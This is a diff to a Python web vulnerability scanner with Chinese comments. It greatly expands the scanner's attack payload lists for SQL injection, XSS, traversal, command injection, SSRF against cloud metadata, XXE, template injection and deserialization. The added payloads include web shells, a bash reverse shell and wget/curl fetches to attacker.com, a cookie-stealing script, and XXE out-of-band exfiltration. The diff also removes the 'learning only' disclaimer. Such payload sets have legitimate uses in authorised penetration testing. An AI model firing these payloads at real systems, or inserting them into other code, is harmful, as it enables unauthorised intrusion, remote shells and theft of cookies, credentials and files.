@@ -19,7 +19,7 @@ CONFIG = {
         "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
         "Mozilla/5.0 (Linux; Android 10; SM-G981B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.162 Mobile Safari/537.36"
     ],
-    "common_params": ["id", "user", "name", "page", "view", "file", "search", "query", "cmd"],
+    "common_params": ["id", "user", "name", "page", "view", "file", "search", "query", "cmd", "action"],
     "output_dir": "scan_results"
 }
 
@@ -46,20 +46,36 @@ SENSITIVE_PATHS = [
     "LICENSE", "README.md", "CHANGELOG.txt", "error_log"
 ]
 
-# 全面的漏洞检测规则
+# 全面扩展的漏洞检测规则
 VULNERABILITY_CHECKS = {
     "SQL注入": {
         "payloads": [
             "'", "\"", "')", "\")", "';--", "\";--", 
             "' OR '1'='1", "' OR 1=1--", "\" OR \"\"=\"", 
             "' UNION SELECT null,version()--", 
-            "' AND 1=convert(int,(SELECT @@version))--"
+            "' AND 1=convert(int,(SELECT @@version))--",
+            "' AND SLEEP(5)--", 
+            "' OR EXISTS(SELECT * FROM information_schema.tables)--",
+            "' OR 1=1 LIMIT 1 -- -",
+            "' OR 1=1 UNION SELECT 1,2,3,4,5,6--",
+            "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
+            "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
+            "' OR IF(1=1, SLEEP(5), 0)--",
+            "' OR ASCII(SUBSTRING((SELECT @@version),1,1)) > 0--",
+            "' OR 1=1 INTO OUTFILE '/tmp/test.txt'--",
+            "' OR 1=1 INTO DUMPFILE '/tmp/test.php'--",
+            "' OR BENCHMARK(5000000,MD5('test'))--"
         ],
         "patterns": [
             r"SQL syntax.*MySQL", r"Warning.*mysql", 
             r"unclosed quotation mark", r"syntax error",
             r"Microsoft SQL Server", r"PostgreSQL", 
-            r"SQLite", r"ORA-[0-9]{5}"
+            r"SQLite", r"ORA-[0-9]{5}",
+            r"MariaDB", r"SQL syntax.*near",
+            r"PostgreSQL.*ERROR", r"SQLite.*error",
+            r"ODBC.*error", r"JDBC.*error",
+            r"Fatal error.*MySQL", r"Warning.*pg_",
+            r"SQLSTATE\[\d+\]"
         ],
         "methods": ["GET", "POST"],
         "reproduce": "使用工具如SQLMap验证或手动发送恶意SQL语句"
@@ -70,12 +86,29 @@ VULNERABILITY_CHECKS = {
             "\"><script>alert(1)</script>", 
             "<img src=x onerror=alert(1)>", 
             "javascript:alert(1)", 
-            "\" onmouseover=alert(1)//"
+            "\" onmouseover=alert(1)//",
+            "<svg/onload=alert(1)>",
+            "<body onload=alert(1)>",
+            "<iframe src=javascript:alert(1)>",
+            "<a href=javascript:alert(1)>click</a>",
+            "<details open ontoggle=alert(1)>",
+            "<video><source onerror=alert(1)>",
+            "<audio src=x onerror=alert(1)>",
+            "<form action=javascript:alert(1)><input type=submit>",
+            "<input type=text value=\"\" autofocus onfocus=alert(1)>",
+            "<marquee onscroll=alert(1)>scroll me</marquee>",
+            "<object data=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==>",
+            "javascript:eval('al'+'ert(1)')",
+            "javascript:document.write('<script>alert(1)</script>')",
+            "javascript:setTimeout('alert(1)',0)"
         ],
         "patterns": [
             r"<script>alert\(1\)</script>", 
             r"<img src=x onerror=alert\(1\)>",
-            r"javascript:alert\(1\)"
+            r"javascript:alert\(1\)",
+            r"<svg/onload=alert\(1\)>",
+            r"<iframe src=javascript:alert\(1\)>",
+            r"<a href=javascript:alert\(1\)>click</a>"
         ],
         "methods": ["GET", "POST"],
         "reproduce": "在浏览器中直接访问构造的URL"
@@ -85,11 +118,25 @@ VULNERABILITY_CHECKS = {
             "../../../../etc/passwd", 
             "....//....//etc/passwd",
             "%2e%2e%2fetc%2fpasswd",
-            "..%5c..%5cwindows%5cwin.ini"
+            "..%5c..%5cwindows%5cwin.ini",
+            "../../../../../../../../etc/passwd%00",
+            "../../../../../../../../etc/passwd%00.jpg",
+            "/etc/passwd",
+            "c:/windows/win.ini",
+            "..\\..\\..\\..\\windows\\win.ini",
+            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
+            "..%255c..%255c..%255c..%255c..%255c..%255c..%255c..%255cetc%255cpasswd",
+            "....\\....\\....\\....\\windows\\win.ini",
+            "..%c0%af..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
+            "..%u2215..%u2215..%u2215..%u2215etc%u2215passwd"
         ],
         "patterns": [
             r"root:.*:0:0:", r"bin:.*:1:1:",
-            r"\[(fonts|extensions)\]"
+            r"\[(fonts|extensions)\]",
+            r"\[mail\]", r"\[MCI Extensions\]",
+            r"\[sound\]", r"\[drivers\]",
+            r"for 16-bit app support\]",
+            r"\[mci\]", r"\[wave\]"
         ],
         "methods": ["GET"],
         "reproduce": "在浏览器中访问包含恶意路径的URL"
@@ -98,11 +145,36 @@ VULNERABILITY_CHECKS = {
         "payloads": [
             ";id", "|id", "&&id", "`id`", 
             "$(id)", "||id", "id%00", 
-            "id'", "id\"", "id`"
+            "id'", "id\"", "id`",
+            "id; echo 'test'",
+            "id | whoami",
+            "id && echo 'success'",
+            "id || echo 'failed'",
+            "id `echo test`",
+            "id $(echo test)",
+            "id; ping -c 5 127.0.0.1",
+            "id; sleep 5",
+            "id; cat /etc/passwd",
+            "id; dir c:\\",
+            "id; net user",
+            "id; ipconfig /all",
+            "id; uname -a",
+            "id; ls -la",
+            "id; wget http://attacker.com/malware",
+            "id; curl http://attacker.com/malware",
+            "id; nc -nv 127.0.0.1 4444"
         ],
         "patterns": [
             r"uid=\d+\([^)]+\)", r"gid=\d+\([^)]+\)",
-            r"Microsoft Windows \[Version"
+            r"Microsoft Windows \[Version",
+            r"inet addr", r"Ethernet adapter",
+            r"Directory of", r"Volume in drive",
+            r"bytes of memory", r"total \d+",
+            r"kernel version", r"Linux \S+ \d",
+            r"PING 127.0.0.1", r"64 bytes from",
+            r"listening on", r"test",
+            r"success", r"failed",
+            r"root:.*:0:0:", r"Administrator"
         ],
         "methods": ["GET"],
         "reproduce": "发送包含系统命令的请求并检查响应"
@@ -111,11 +183,23 @@ VULNERABILITY_CHECKS = {
         "payloads": [
             "?file=../../../../etc/passwd",
             "?page=php://filter/convert.base64-encode/resource=index.php",
-            "?include=http://evil.com/shell.php"
+            "?include=http://evil.com/shell.php",
+            "?document=file:///etc/passwd",
+            "?load=php://input",
+            "?page=data:text/plain,<?php phpinfo();?>",
+            "?file=expect://id",
+            "?page=zip://archive.zip#malicious.php",
+            "?include=phar://archive.phar/malicious.php",
+            "?load=filter/read=string.rot13/resource=index.php"
         ],
         "patterns": [
             r"root:.*:0:0:", r"<\?php", r"base64 encoded content",
-            r"evil\.com"
+            r"evil\.com", r"PHP Version",
+            r"uid=\d+\([^)]+\)", r"Microsoft Windows",
+            r"Configuration File", r"Environment",
+            r"Variable", r"Directive",
+            r"Registered Stream Filters",
+            r"<title>phpinfo()</title>"
         ],
         "methods": ["GET"],
         "reproduce": "访问包含恶意文件路径的URL"
@@ -124,10 +208,18 @@ VULNERABILITY_CHECKS = {
         "payloads": [
             "?redirect=https://evil.com",
             "?url=//evil.com",
-            "?next=javascript:alert(1)"
+            "?next=javascript:alert(1)",
+            "?goto=http://attacker.com",
+            "?return=https://phishing.com",
+            "?dest=//evil.com@example.com",
+            "?target=//evil.com",
+            "?rurl=http://malicious.site",
+            "?forward=http://bad.com",
+            "?continue=https://fake.example.com"
         ],
         "patterns": [
-            r"Location:.*(evil.com|javascript:)"
+            r"Location:.*(evil.com|javascript:|attacker.com|phishing.com|malicious.site|bad.com|fake.example.com)",
+            r"Refresh:.*url=.*(evil.com|attacker.com)"
         ],
         "methods": ["GET"],
         "reproduce": "点击包含恶意重定向参数的链接"
@@ -136,11 +228,27 @@ VULNERABILITY_CHECKS = {
         "payloads": [
             "?url=http://169.254.169.254/latest/meta-data/",
             "?image=http://localhost:22",
-            "?server=file:///etc/passwd"
+            "?server=file:///etc/passwd",
+            "?fetch=http://127.0.0.1:80",
+            "?load=http://192.168.0.1/admin",
+            "?resource=http://[::1]:80/",
+            "?uri=dict://localhost:11211/stat",
+            "?get=ftp://attacker.com:21",
+            "?api=http://localhost:8080/internal",
+            "?path=http://169.254.169.254/latest/user-data",
+            "?host=http://metadata.google.internal/computeMetadata/v1beta1/",
+            "?service=http://localhost:3306",
+            "?connect=http://admin:password@localhost"
         ],
         "patterns": [
             r"AMAZON_META_DATA", r"root:.*:0:0:", 
-            r"SSH", r"EC2"
+            r"SSH", r"EC2",
+            r"instance-id", r"public-keys",
+            r"hostname", r"iam",
+            r"security-credentials", r"computeMetadata",
+            r"MySQL", r"Redis",
+            r"Memcached", r"Internal Server",
+            r"Access Denied", r"Unauthorized"
         ],
         "methods": ["GET"],
         "reproduce": "发送包含内部URL的请求并检查响应"
@@ -148,10 +256,17 @@ VULNERABILITY_CHECKS = {
     "XML外部实体注入(XXE)": {
         "payloads": [
             '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
-            '<?xml version="1.0"?><!DOCTYPE data [<!ENTITY % remote SYSTEM "http://attacker.com/xxe">%remote;]>'
+            '<?xml version="1.0"?><!DOCTYPE data [<!ENTITY % remote SYSTEM "http://attacker.com/xxe">%remote;]>',
+            '<?xml version="1.0"?><!DOCTYPE test [<!ENTITY % xxe SYSTEM "file:///etc/passwd">%xxe;]>',
+            '<?xml version="1.0"?><!DOCTYPE data [<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd"><!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">%dtd;%send;]>',
+            '<?xml version="1.0"?><!DOCTYPE data [<!ENTITY % init SYSTEM "data://text/plain;base64,PCFFTlRJVFkgJSBmaWxlIFNZU1RFTSAiZmlsZTovLy9ldGMvcGFzc3dkIj4=">%init;]>',
+            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id">]><foo>&xxe;</foo>'
         ],
         "patterns": [
-            r"root:.*:0:0:", r"ENTITY"
+            r"root:.*:0:0:", r"ENTITY",
+            r"bin:.*:1:1:", r"daemon:",
+            r"www-data:", r"base64 encoded",
+            r"uid=\d+\([^)]+\)", r"gid=\d+\([^)]+\)"
         ],
         "methods": ["POST"],
         "headers": {"Content-Type": "application/xml"},
@@ -162,20 +277,42 @@ VULNERABILITY_CHECKS = {
             "{{7*7}}",
             "${7*7}",
             "<%= 7*7 %>",
-            "${{<%[%'\"}}%\\"
+            "${{<%[%'\"}}%\\",
+            "#{7*7}",
+            "{{ ''.__class__.__mro__[1].__subclasses__() }}",
+            "${T(java.lang.Runtime).getRuntime().exec('id')}",
+            "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ ex(\"id\") }",
+            "{{ request.application.__globals__.__builtins__.__import__('os').popen('id').read() }}",
+            "{{config.items()}}",
+            "{{self}}",
+            "{{settings.SECRET_KEY}}"
         ],
         "patterns": [
-            r"49", r"343", r"14"
+            r"49", r"343", r"14",
+            r"uid=\d+\([^)]+\)", r"gid=\d+\([^)]+\)",
+            r"subclass of", r"class '__main__",
+            r"os\.popen", r"SECRET_KEY =",
+            r"<Config", r"<module",
+            r"built-in function", r"<class"
         ],
         "methods": ["GET", "POST"],
         "reproduce": "在输入字段提交模板表达式并检查输出"
     },
     "不安全的反序列化": {
         "payloads": [
-            "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAABc3IADGphdmEubmV0LlVSSTbXKlc3YVf6DAAAeHBzcgARamF2YS5sYW5nLkludGVnZXIS4qCk94GHOAIAAUkABXZhbHVleHIAEGphdmEubGFuZy5OdW1iZXKGrJUdC5TgiwIAAHhwAAAAAXVxAH4AAgAAAAN1cQB+AAIAAAACdAAFaW5qZWN0dAAEY29kZXg="
+            "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAABc3IADGphdmEubmV0LlVSSTbXKlc3YVf6DAAAeHBzcgARamF2YS5sYW5nLkludGVnZXIS4qCk94GHOAIAAUkABXZhbHVleHIAEGphdmEubGFuZy5OdW1iZXKGrJUdC5TgiwIAAHhwAAAAAXVxAH4AAgAAAAN1cQB+AAIAAAACdAAFaW5qZWN0dAAEY29kZXg=",
+            "O:8:\"stdClass\":1:{s:4:\"test\";s:4:\"test\";}",
+            "a:1:{i:0;O:8:\"stdClass\":1:{s:4:\"test\";s:4:\"test\";}}",
+            "{\"@type\":\"java.lang.Runtime\"}",
+            "{\"@type\":\"com.example.VulnerableClass\"}",
+            "{\"@type\":\"org.springframework.context.support.FileSystemXmlApplicationContext\",\"configLocation\":\"http://attacker.com/spel.xml\"}"
         ],
         "patterns": [
-            r"java\.", r"serialization", r"deserialization"
+            r"java\.", r"serialization", r"deserialization",
+            r"stdClass", r"Runtime",
+            r"ClassNotFoundException", r"java\.lang\.",
+            r"org\.springframework", r"FileSystemXmlApplicationContext",
+            r"Error in deserialization", r"Invalid object"
         ],
         "methods": ["POST"],
         "headers": {"Content-Type": "application/java-serialized-object"},
@@ -183,10 +320,19 @@ VULNERABILITY_CHECKS = {
     },
     "文件上传漏洞": {
         "payloads": [
-            "test"
+            "test",
+            "<?php echo shell_exec($_GET['cmd']); ?>",
+            "<% Runtime.getRuntime().exec(request.getParameter(\"cmd\")); %>",
+            "#!/bin/bash\n/bin/bash -i >& /dev/tcp/attacker.com/4444 0>&1",
+            "<script>document.write('<img src=\"http://attacker.com/'+document.cookie+'\">')</script>"
         ],
         "patterns": [
-            r"upload successful", r"file saved"
+            r"upload successful", r"file saved",
+            r"File uploaded", r"Successfully uploaded",
+            r"phpinfo", r"shell_exec",
+            r"Runtime\.getRuntime", r"bin/bash",
+            r"<img src=\"http://attacker\.com/",
+            r"<?php"
         ],
         "methods": ["POST"],
         "files": {"file": ("test.php", "<?php phpinfo(); ?>", "application/x-php")},
@@ -195,10 +341,24 @@ VULNERABILITY_CHECKS = {
     "LDAP注入": {
         "payloads": [
             "*)(uid=*))(|(uid=*",
-            "*))%00"
+            "*))%00",
+            "admin)(|(password=*)",
+            "*)(|(objectclass=*",
+            "*))(&(uid=*)",
+            "*)(uid=*))(%00",
+            "*)(|(mail=*",
+            ")(cn=))\x00",
+            "*)(objectClass=*))(&(objectClass=void",
+            "*)(|(sn=*",
+            "admin*)((|userPassword=*)",
+            "*)(uid=*)))(|(uid=*"
         ],
         "patterns": [
-            r"ldap_.*error", r"invalid filter", r"search result"
+            r"ldap_.*error", r"invalid filter",
+            r"search result", r"size limit exceeded",
+            r"time limit exceeded", r"operations error",
+            r"protocol error", r"authentication failure",
+            r"invalid DN", r"no such object"
         ],
         "methods": ["GET", "POST"],
         "reproduce": "在LDAP查询字段提交恶意输入"
@@ -206,10 +366,23 @@ VULNERABILITY_CHECKS = {
     "XPath注入": {
         "payloads": [
             "' or '1'='1",
-            "' or position()=last()"
+            "' or position()=last()",
+            "' or count(/*)=1 or '",
+            "' or string-length(name(/*[1]))=4 or '",
+            "' or contains(name(/*[1]), 'x') or '",
+            "' or substring(name(/*[1]), 1, 1) = 'x' or '",
+            "' and 1=2 or '",
+            "' | //*",
+            "' and //user[position()=2] or '",
+            "' and count(//user)=10 or '",
+            "' and string(//user[1]/username)='admin' or '"
         ],
         "patterns": [
-            r"XPath.*error", r"invalid expression"
+            r"XPath.*error", r"invalid expression",
+            r"Expected '\]'", r"Expected end of expression",
+            r"query returned \d+ results", r"result set",
+            r"XPathException", r"evaluation failed",
+            r"Invalid predicate", r"axis step"
         ],
         "methods": ["GET", "POST"],
         "reproduce": "在XPath查询字段提交恶意输入"
@@ -217,11 +390,25 @@ VULNERABILITY_CHECKS = {
     "HTTP头注入": {
         "payloads": [
             "test\r\nX-Forwarded-For: 127.0.0.1",
-            "test\r\nSet-Cookie: malicious=true"
+            "test\r\nSet-Cookie: malicious=true",
+            "test\r\nHost: evil.com",
+            "test\r\nReferer: http://evil.com",
+            "test\r\nUser-Agent: <?php system($_GET['cmd']); ?>",
+            "test\r\nLocation: http://evil.com",
+            "test\r\nX-Forwarded-Host: evil.com",
+            "test\r\nX-Original-URL: /admin",
+            "test\r\nX-Rewrite-URL: /admin"
         ],
         "patterns": [
             r"X-Forwarded-For: 127\.0\.0\.1", 
-            r"Set-Cookie: malicious=true"
+            r"Set-Cookie: malicious=true",
+            r"Host: evil.com",
+            r"Referer: http://evil.com",
+            r"User-Agent: <?php system\(\$_GET\['cmd'\]\); ?>",
+            r"Location: http://evil.com",
+            r"X-Forwarded-Host: evil.com",
+            r"X-Original-URL: /admin",
+            r"X-Rewrite-URL: /admin"
         ],
         "methods": ["GET"],
         "headers": True,
@@ -230,21 +417,52 @@ VULNERABILITY_CHECKS = {
     "身份验证绕过": {
         "payloads": [
             "?admin=true",
-            "?role=administrator"
+            "?role=administrator",
+            "?is_admin=1",
+            "?auth=bypass",
+            "?superuser=yes",
+            "?access_level=999",
+            "?debug=true",
+            "?bypass_auth=1",
+            "?token=superadmin",
+            "?user_id=0",
+            "?admin_mode=enabled",
+            "?root=true",
+            "?privileged=1"
         ],
         "patterns": [
-            r"admin panel", r"welcome administrator"
+            r"admin panel", r"welcome administrator",
+            r"Super User Dashboard", r"Administration Console",
+            r"System Configuration", r"User Management",
+            r"Access granted", r"Privileged access",
+            r"Debug mode enabled", r"Root access"
         ],
         "methods": ["GET"],
         "reproduce": "使用特殊参数访问受限页面"
     },
     "敏感数据暴露": {
         "payloads": [
-            "?debug=true"
+            "?debug=true",
+            "?env=production",
+            "?show_source=1",
+            "?dump=1",
+            "?export=all",
+            "?backup=1",
+            "?config=view",
+            "?display_errors=1",
+            "?log_level=debug",
+            "?verbose=true",
+            "?trace=enable"
         ],
         "patterns": [
             r"password", r"api_key", r"secret", 
-            r"database", r"credentials"
+            r"database", r"credentials",
+            r"DB_USER", r"DB_PASSWORD",
+            r"SECRET_KEY", r"API_TOKEN",
+            r"ENV", r"Config",
+            r"DEBUG", r"Stack trace",
+            r"Error log", r"Backup",
+            r"Database dump", r"Connection string"
         ],
         "methods": ["GET", "POST"],
         "reproduce": "访问调试接口或包含敏感信息的URL"
@@ -289,7 +507,22 @@ class SecurityScanner:
             "api/v1/users",
             "admin/login.php",
             "debug.php",
-            "phpinfo.php"
+            "phpinfo.php",
+            "config.js",
+            "database.yml",
+            "secrets.yml",
+            ".npmrc",
+            ".dockercfg",
+            "docker-compose.yml",
+            "dockerfile",
+            "sftp-config.json",
+            "sitemap.xml",
+            "crossdomain.xml",
+            "clientaccesspolicy.xml",
+            "phpunit.xml",
+            "travis.yml",
+            "jenkinsfile",
+            "gitlab-ci.yml"
         ]
     
     def test_path(self, path):
@@ -455,7 +688,7 @@ class SecurityScanner:
         print(f"[*] 漏洞检测完成，发现 {len(self.vulnerabilities)} 个潜在漏洞")
     
     def generate_txt_report(self):
-        """生成包含复现指南的TXT格式扫描报告"""
+        """生成包含复现指南和Payload的TXT格式扫描报告"""
         # 生成文件名
         domain = urlparse(self.target_url).netloc.replace(':', '_')
         timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
@@ -486,7 +719,7 @@ class SecurityScanner:
 漏洞类型: {vuln['type']}
 URL地址: {vuln['url']}
 HTTP方法: {vuln['method']}
-利用载荷: {vuln['payload']}
+触发Payload: {vuln['payload']}
 HTTP状态码: {vuln['status']}
 
 复现步骤:
@@ -510,6 +743,18 @@ HTTP状态码: {vuln['status']}
 """
         for path in self.found_paths:
             report_content += f"- {path['url']} (状态码: {path['status']})\n"
+        
+        # 添加Payload库摘要
+        report_content += """
+============================
+Payload库摘要:
+"""
+        for vuln_type, vuln_data in VULNERABILITY_CHECKS.items():
+            report_content += f"""
+{vuln_type}:
+  测试Payload数量: {len(vuln_data['payloads'])}
+  示例Payload: {vuln_data['payloads'][0]}
+"""
         
         # 添加通用修复指南
         report_content += """
@@ -576,8 +821,8 @@ def main():
     ██╔══╝  ██║     ██╔══╝  ██╔══██║██╔═══╝ ██║   ██║     ╚██╔╝  
     ██║     ╚██████╗███████╗██║  ██║██║     ██║   ██║      ██║   
     ╚═╝      ╚═════╝╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝   ╚═╝      ╚═╝   
-    作者:火龙果小泽先生
-    工具仅提供学习，违法一律跟作者无关
+    作者:火龙果小泽
+    交流群:907265438
     """)
     
     if len(sys.argv) < 2:
@@ -604,6 +849,7 @@ def main():
         print(f"    - 测试路径: {len(scanner.load_wordlist())}")
         print(f"    - 有效路径: {len(scanner.found_paths)}")
         print(f"    - 发现漏洞: {len(scanner.vulnerabilities)}")
+        print(f"[*] Payload总数: {sum(len(v['payloads']) for v in VULNERABILITY_CHECKS.values())}")
         print("[!] 重要提示: 本工具仅用于授权测试，使用前请确保您有合法权限")
         
     except KeyboardInterrupt:
